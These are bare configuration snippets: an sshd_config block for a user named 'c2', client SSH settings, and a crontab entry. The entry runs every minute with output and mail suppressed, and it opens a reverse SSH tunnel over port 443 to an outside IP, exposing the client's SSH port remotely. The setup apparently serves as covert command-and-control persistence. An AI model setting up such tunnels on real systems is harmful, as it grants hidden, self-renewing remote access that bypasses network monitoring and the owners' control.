# Server: /etc/ssh/sshd_config.
Match User c2
  AuthenticationMethods   publickey
  HostbasedAuthentication no
  RhostsRSAAuthentication no
  GSSAPIAuthentication    no
  PasswordAuthentication  no
  AllowAgentForwarding    no
  GatewayPorts            no
  X11Forwarding           no
  AllowTcpForwarding      yes
  Banner                  none
  ForceCommand            /sbin/nologin
  PermitOpen              172.16.7.131:2224

## Client: /etc/ssh/sshd_config.

```
ClientAliveInterval 20
ClientAliveCountMax 3
AllowUsers c2@127.0.0.1
```

### crontab.
```
MAILTO=""
* * * * * (ssh -p 443 -fNR 127.0.0.1:4450:127.0.0.1:22 c2@197.15.100.245 &>/dev/null &)  
```

